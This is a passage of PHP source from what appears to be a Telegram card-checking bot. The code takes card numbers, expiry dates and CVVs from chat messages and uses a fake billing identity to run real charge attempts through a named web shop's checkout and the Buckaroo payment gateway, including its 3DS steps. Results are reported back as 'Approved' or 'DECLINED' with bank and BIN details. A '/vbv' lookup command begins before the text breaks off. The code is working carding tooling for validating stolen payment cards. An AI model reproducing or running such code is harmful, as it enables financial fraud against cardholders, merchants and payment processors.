    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
curl_close($ch);


# Separate

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/onestepcheckout/ajax/set_methods_separate/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /onestepcheckout/ajax/set_methods_separate/ HTTP/3',
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/javascript, text/html, application/xml, text/xml, */*',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'X-Prototype-Version: 1.7',
    'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://www.outdoorxl.eu',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://www.outdoorxl.eu/onestepcheckout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_method=matrixrate_matrixrate_55161&payment_method=buckaroo3extended_ideal');

$MethodsSeparate = curl_exec($ch);
curl_close($ch);


# Save Billing

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/onestepcheckout/ajax/save_billing/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /onestepcheckout/ajax/save_billing/ HTTP/3',
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/javascript, text/html, application/xml, text/xml, */*',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'X-Prototype-Version: 1.7',
    'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://www.outdoorxl.eu',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://www.outdoorxl.eu/onestepcheckout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_method=matrixrate_matrixrate_55161&billing%5Bfirstname%5D=Som&billing%5Blastname%5D=Knows&billing%5Bemail%5D=dwdawdas%40gmail.com&billing%5Btelephone%5D=4193939123&billing%5Bstreet%5D%5B0%5D=4813%20Olive%20St&billing%5Bstreet%5D%5B1%5D=&billing%5Bcity%5D=Commerce%20City&billing%5Bpostcode%5D=47456&billing%5Bregion%5D=&billing%5Bcustomer_password%5D=&billing%5Bconfirm_password%5D=&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1&billing%5Bregion_id%5D=&billing%5Bcountry_id%5D=IE&payment_method=buckaroo3extended_ideal&payment%5Bmethod%5D=buckaroo3extended_ideal');

$SaveBilling = curl_exec($ch);
curl_close($ch);


# Onestep Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/onestepcheckout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /onestepcheckout/ HTTP/3',
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.outdoorxl.eu',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://www.outdoorxl.eu/onestepcheckout/',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing%5Bfirstname%5D=Som&billing%5Blastname%5D=Knows&billing%5Bemail%5D=dwdawdas%40gmail.com&billing%5Btelephone%5D=4193939123&billing%5Bstreet%5D%5B0%5D=4813+Olive+St&billing%5Bstreet%5D%5B1%5D=&billing%5Bcity%5D=Commerce+City&billing%5Bpostcode%5D=47456&billing%5Bregion_id%5D=&billing%5Bregion%5D=&billing%5Bcountry_id%5D=IE&billing%5Bcustomer_password%5D=&billing%5Bconfirm_password%5D=&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1&shipping%5Bfirstname%5D=&shipping%5Blastname%5D=&shipping%5Bstreet%5D%5B0%5D=&shipping%5Bstreet%5D%5B1%5D=&shipping%5Bcity%5D=&shipping%5Bpostcode%5D=&shipping%5Bregion_id%5D=&shipping%5Bregion%5D=&shipping%5Bcountry_id%5D=IE&shipping%5Btelephone%5D=&shipping%5Bsave_in_address_book%5D=1&shipping%5Baddress_id%5D=1812130&shipping_method=matrixrate_matrixrate_55536&buckaroo3extended_ideal_BPE_Issuer=ABNANL2A&payment%5Bmethod%5D=buckaroo3extended_visa&onestepcheckout_comments=');

$OneStepCheckout = curl_exec($ch);
curl_close($ch);

# Extended VISA/MC

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/buckaroo3extended/checkout/checkout/method/buckaroo3extended_visa/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.outdoorxl.eu/onestepcheckout/',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$Buckaroo = curl_exec($ch);
$RedirectUrl = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
curl_close($ch);


# Redirect ASHX

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $RedirectUrl);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.outdoorxl.eu/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$RedirectASHX = curl_exec($ch);
$RedirectASHXUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);




# Checkout Buckaroo

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $RedirectASHXUrl);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.outdoorxl.eu/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$CheckoutBuckaroo = curl_exec($ch);
$ViewState = trim(strip_tags(GetStr($CheckoutBuckaroo, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="','" />')));
$ViewStateGenerator = trim(strip_tags(GetStr($CheckoutBuckaroo, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="','" />')));
$Transaction = trim(strip_tags(GetStr($CheckoutBuckaroo, '<input type="hidden" name="brq_transaction" id="brq_transaction" value="','" />')));
$BST = trim(strip_tags(GetStr($CheckoutBuckaroo, '<input type="hidden" name="bst" id="bst" value="','" />')));
curl_close($ch);


# Checkout Buckaroo 2

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $RedirectASHXUrl);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://checkout.buckaroo.nl',
    'Connection: keep-alive',
    'Referer: '.$RedirectASHXUrl.'',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '__VIEWSTATE='.urlencode($ViewState).'&__VIEWSTATEGENERATOR='.$ViewStateGenerator.'&brq_transaction='.$Transaction.'&brq_service_visa_action=Pay&bst='.$BST.'&brq_SERVICE_visa_CustomerCardName=Som+Knows&brmv_brq_SERVICE_visa_VisaCreditcardNumber='.$cc.'&brq_SERVICE_visa_VisaCreditcardNumber='.$cc.'&brmv_brq_CardExpirationDate_month='.$mes.'&brmv_brq_CardExpirationDate_year='.$ano.'&brq_CardExpirationDate='.$ano.'-'.$mes.'-01&brq_SERVICE_visa_CVV3='.$cvv.'');

$CheckoutBuckaroo2 = curl_exec($ch);
curl_close($ch);


# Pre Authenticate

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.buckaroo.nl/api/3ds2/'.$Transaction.'/pre-authenticate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Origin: https://checkout.buckaroo.nl',
    'Connection: keep-alive',
    'Referer: '.$RedirectASHXUrl.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Content-Length: 0',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$PreAuthenticate = curl_exec($ch);
$ServerTransactionID = trim(strip_tags(GetStr($PreAuthenticate, '"ServerTransactionId":"','"')));
curl_close($ch);


# Authenticate

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.buckaroo.nl/api/3ds2/'.$Transaction.'/authenticate');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /api/3ds2/EBECEA8D4B3E4B92BAF79DD9D18BC607/authenticate HTTP/1.1',
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: text/plain;charset=UTF-8',
    'Origin: https://checkout.buckaroo.nl',
    'Connection: keep-alive',
    'Referer: '.$RedirectASHXUrl.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"browserAuthenticationData":{"acceptHeader":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","javaEnabled":false,"language":"en-US","screenColorDepth":24,"screenHeight":864,"screenWidth":1536,"timeZone":-480,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0","javaScriptEnabled":true},"methodCompletionIndicator":"U","optionalData":{"challengeWindowSize":4},"serverTransactionId":"'.$ServerTransactionID.'"}');

$Authenticate = curl_exec($ch);
curl_close($ch);


# Finalize

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.buckaroo.nl/api/3ds2/'.$Transaction.'/finalize');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Origin: https://checkout.buckaroo.nl',
    'Connection: keep-alive',
    'Referer: '.$RedirectASHXUrl.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Content-Length: 0',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$Finalize = curl_exec($ch);
$ReturnUrl = trim(strip_tags(GetStr($Finalize, '"ReturnUrl":"','"')));
$Status = trim(strip_tags(GetStr($Finalize, '"TransactionStatus":"','"')));
curl_close($ch);


# Last Redirect

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $ReturnUrl);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: checkout.buckaroo.nl',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: '.$RedirectASHXUrl.'',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$LastRedirect = curl_exec($ch);
$Invoice = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_invoicenumber" value="','" />')));
$Country = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_issuing_country" value="','" />')));
$OrderNumber = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_ordernumber" value="','" />')));
$PayerHash = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_payer_hash" value="','" />')));
$Payment = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_payment" value="','" />')));
$CardT = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_payment_method" value="','" />')));
$ServiceAuthentication = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_SERVICE_visa_Authentication" value="','" />')));
$CardExp = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_SERVICE_visa_CardExpirationDate" value="','" />')));
$StatusCode = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_statuscode" value="','" />')));
$Detail = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_statuscode_detail" value="','" />')));
$Response = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_statusmessage" value="','" />')));
$Timestamp = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_timestamp" value="','" />')));
$WebsiteKey = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_websitekey" value="','" />')));
$Signature = trim(strip_tags(GetStr($LastRedirect, '<input type="hidden" name="brq_signature" value="','" />')));
curl_close($ch);



# Last Buckaroo

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/buckaroo3extended/notify/return/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://checkout.buckaroo.nl',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://checkout.buckaroo.nl/',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'brq_amount=11.94&brq_currency=EUR&brq_customer_name=Som+Knows&brq_description=OutdoorXL+Buckaroo&brq_invoicenumber='.$Invoice.'&brq_issuing_country='.$Country.'&brq_ordernumber='.$OrderNumber.'&brq_payer_hash='.$PayerHash.'&brq_payment='.$Payment.'&brq_payment_method='.$CardT.'&brq_SERVICE_visa_Authentication='.$ServiceAuthentication.'&brq_SERVICE_visa_CardExpirationDate='.$CardExp.'&brq_SERVICE_visa_CardNumberEnding='.$cc4.'&brq_SERVICE_visa_MaskedCreditcardNumber='.$cc6.'******'.$cc4.'&brq_SERVICE_visa_ThreeDsVersion=2.2.0&brq_statuscode='.$StatusCode.'&brq_statuscode_detail='.$Detail.'&brq_statusmessage='.urlencode($Response).'&brq_test=false&brq_timestamp='.urlencode($Timestamp).'&brq_transactions='.$Transaction.'&brq_websitekey='.$WebsiteKey.'&brq_signature='.$Signature.'');

$LastBuckaroo = curl_exec($ch);
curl_close($ch);



# Checkout Response

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/onestepcheckout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://checkout.buckaroo.nl/',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$CheckoutResponse = curl_exec($ch);


$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);

$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);

curl_close($ch);




# Responses >

if(strpos($LastRedirect, 'name="brq_statusmessage" value="The request was successful."') ) {
sendMessage($chatId, '<b>CVV Matched - Approved! ($11.94)</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Buckaroo%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>DECLINED</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Buckaroo%0A<b><u>Response:</u></b> '.$Response.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}

curl_close($ch);
unlink('cookie.txt');

}



#--------------------- [ VBV/MSC Lookup ]-------------------#

if ((strpos($message, "!vbv") === 0)||(strpos($message, "/vbv") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };



error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
